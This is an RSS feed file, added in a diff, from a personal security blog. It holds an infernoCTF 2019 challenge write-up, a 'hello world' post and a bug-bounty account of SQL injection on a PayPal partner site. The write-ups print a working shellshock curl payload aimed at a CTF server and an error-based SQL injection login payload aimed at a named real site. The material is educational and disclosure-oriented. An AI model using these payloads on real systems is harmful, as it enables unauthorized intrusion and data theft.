@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title></title>
+    <description></description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 18 Mar 2020 05:22:07 -0400</pubDate>
+    <lastBuildDate>Wed, 18 Mar 2020 05:22:07 -0400</lastBuildDate>
+    <generator>Jekyll v4.0.0</generator>
+    
+      <item>
+        <title>infernoCTF 2019</title>
+        <description>&lt;h1 id=&quot;merry-christmas-forensic-200&quot;&gt;Merry Christmas (Forensic, 200)&lt;/h1&gt;
+&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;OSINT is the way
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;We were given a zip file named &lt;code class=&quot;highlighter-rouge&quot;&gt;output.zip&lt;/code&gt; and a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;What is mrT4ntr4's last name?&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Most probably the password of the zip file is mrT4ntr4’s last name. So let’s search it over the internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-48-27.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After extracting the zip file with a password “Malhotra”, there’s this file named &lt;code class=&quot;highlighter-rouge&quot;&gt;flag.gif&lt;/code&gt;. Did some check on the gif file and foundout that the header was modified.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_05-57-28.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file signature for GIF file should be like this &lt;strong&gt;47 49 46 38 37 61&lt;/strong&gt; or &lt;strong&gt;47 49 46 38 39 61&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Fixing the modified header to its original will give us the flag!&lt;/p&gt;
+
+&lt;!-- ![nice](/assets/images/Screenshot_2019-12-28_06-06-37.png) --&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/infernoCTF_2019_flag.gif&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{M3RRy_ChR1stmAs}&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;we-will-we-will-shock-you-web-150&quot;&gt;We will we will Shock You (Web, 150)&lt;/h1&gt;
+&lt;h3 id=&quot;description-1&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://104.197.168.32:17012/index.html&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;The title itself gives me an idea that maybe it’s a shellshock bash bug.&lt;/p&gt;
+
+&lt;p&gt;Checking the source code of the website gives me this file &lt;code class=&quot;highlighter-rouge&quot;&gt;bashferno.cgi&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-15-42.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok lets try to get that flag using shellshock exploit.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;curl -H “user-agent: () { :; }; echo; echo; /bin/ls” http://104.197.168.32:17012/bashferno.cgi&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-20-42.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;cat’ting the txt file will give us the flag&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -H &quot;user-agent: () { :; }; echo; echo; /bin/cat flag_for_this_INFERNO.txt&quot; http://104.197.168.32:17012/bashferno.cgi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;reading the text file will give us the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{F33l_Th3_Sh0ck}&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;check-again-200&quot;&gt;Check Again (200)&lt;/h1&gt;
+&lt;h3 id=&quot;description-2&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Did you check the site , I mean check again.&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;We we’re given a text file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Openit&lt;/code&gt; and a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;Dante Nero Sparda are the true demons.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the text file give me this lol&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Check Again!!!&lt;/p&gt;
+
+  &lt;p&gt;…&lt;/p&gt;
+
+  &lt;p&gt;Press Home Btn.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As you can see in the hint &lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;ante &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;ro &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt;parda are the true demons.&lt;/p&gt;
+
+&lt;p&gt;So okay, we need to check the DNS of the website.&lt;/p&gt;
+
+&lt;p&gt;I used &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;dnsrecon&lt;/a&gt; for this.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsrecon -d infernoctf.live -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-39-08.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{N1c3_Pl4c3_70_h1d3_1n_th3_Rec0rds}&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;whistle-blower-osint-226&quot;&gt;Whistle Blower (OSINT, 226)&lt;/h1&gt;
+&lt;h3 id=&quot;description-3&quot;&gt;Description&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;After playing some 2048 you come across an interesting email exchange… What could it lead to?&lt;/em&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-3&quot;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;Cheking the file &lt;code class=&quot;highlighter-rouge&quot;&gt;employment_status.mbox&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Gmail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Opened&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leak&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Tue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Dec&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0800&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Status&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Regarding&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Employment&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iam&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;thedeveloper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imdeveloper123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;gmail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;To&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;angry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;employer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;veryangryemployer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;gmail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;multipart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alternative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0000000000005405a8059a7a4108&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000000000005405&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a8059a7a4108&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;UTF-8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Angry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Employer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;I&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;will&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stand&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;was&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;simple&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mistake&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;anyone&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;could&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;have&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;made&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;anything&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;I&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;should&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blame&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;company&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;training&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;m leaking all confidential information, on purpose this time.
+
+Hope you like being the center of attention on infosec twitter!
+
+- imdeveloper123
+
+On Tue, Dec 24, 2019 at 1:54 PM angry employer &amp;lt;veryangryemployer@gmail.com&amp;gt;
+wrote:
+
+Hello Mr. imdeveloper123,
+
+Are you kidding me? You leaked company info by making the dot-files you
+use for work purposes *public* on your GitHub?
+It should come at no surprise that as of the time of writing this email,
+you are permanently released from your current job.
+
+Please talk to HR ASAP.
+
+- Angry Employer
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This line &lt;code class=&quot;highlighter-rouge&quot;&gt;Hope you like being the center of attention on infosec twitter!&lt;/code&gt; gives me an idea. Let’s find something useful on twitter!&lt;/p&gt;
+
+&lt;p&gt;Tried searching &lt;code class=&quot;highlighter-rouge&quot;&gt;imdeveloper123&lt;/code&gt; on twitter and it leads me to this account &lt;a href=&quot;https://twitter.com/imdeveloper123&quot;&gt;@imdeveloper123&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2019-12-28_06-56-29.png&quot; alt=&quot;nice&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the deleted website on &lt;a href=&quot;https://web.archive.org/web/20191224223734/https://iamthedeveloper123.weebly.com/&quot;&gt;https://web.archive.org/web/20191224223734/https://iamthedeveloper123.weebly.com/&lt;/a&gt; will give us the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;infernoCTF{y0u_f0und_7h3_d1sgrun7l3d_empl0y33!}&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;That’s a wrap! Thank you for reading. Just finished 109th with 786 pts&lt;/p&gt;
+
+&lt;p&gt;Badly need more time to learn crypto, pwn and reverse engineering.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 28 Dec 2019 05:34:17 -0500</pubDate>
+        <link>http://localhost:4000/2019/inferno-ctf-2019/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/inferno-ctf-2019/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>hello world</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://www.memecreator.org/static/images/memes/5052832.jpg&quot; alt=&quot;hello world&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 15 Sep 2019 00:00:00 -0400</pubDate>
+        <link>http://localhost:4000/2019/hello-world/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/hello-world/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>sqli in paypal partner</title>
+        <description>&lt;p&gt;It’s been a year after my website ‘jeroldcamacho.com’ was gone because I forgot to renew my domain and I don’t even have a backup of my website nor my blog posts. As the title says “how i got my 1000$ from paypal partner site.”. So, here it goes.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Easy2Export&lt;/strong&gt; is one of paypal partner website, yeah it is! &lt;a href=&quot;http://www.ecommercebytes.com/cab/abn/y13/m12/i24/s04&quot;&gt;[..]&lt;/a&gt;&lt;/p&gt;
+
+&lt;center&gt;
+&lt;img src=&quot;https://jmrncz.files.wordpress.com/2016/05/yeah-m.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+At first, i tried to break the login form. After a few minutes of testing, I foundout that the login form is vulnerable to POST SQL Injection.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://easy2export.com/index.php/site/login
+
+POST /index.php/site/login HTTP/1.1
+Host: easy2export.com
+…
+LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&amp;amp;LoginForm[password]=’&amp;amp;LoginForm[accounttype]=sub&amp;amp;LoginForm[rememberMe]=0&amp;amp;yt0=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://jmrncz.files.wordpress.com/2016/05/easy2export-sql-injection1.png&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+I immediately reported this to PayPal and they fixed the vulnerability issue quickly. &lt;strong&gt;[10/30/2014 09:21:53]&lt;/strong&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;
+&lt;img src=&quot;https://jmrncz.files.wordpress.com/2016/05/inhale-m.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+In their bug bounty program guidelines, it is noted that sql injection in paypal partner sites will receive 1000$.
+.
+.
+And they checked the eligibility of my report so they then send me the reward amounting to 1000$. &lt;strong&gt;[11/22/14 6:23:35]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://jmrncz.files.wordpress.com/2016/05/paypal-bounty.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading! stay tuned for more blog posts.&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 22 Nov 2014 07:14:07 -0500</pubDate>
+        <link>http://localhost:4000/2014/sqli-in-paypal-partner/</link>
+        <guid isPermaLink="true">http://localhost:4000/2014/sqli-in-paypal-partner/</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
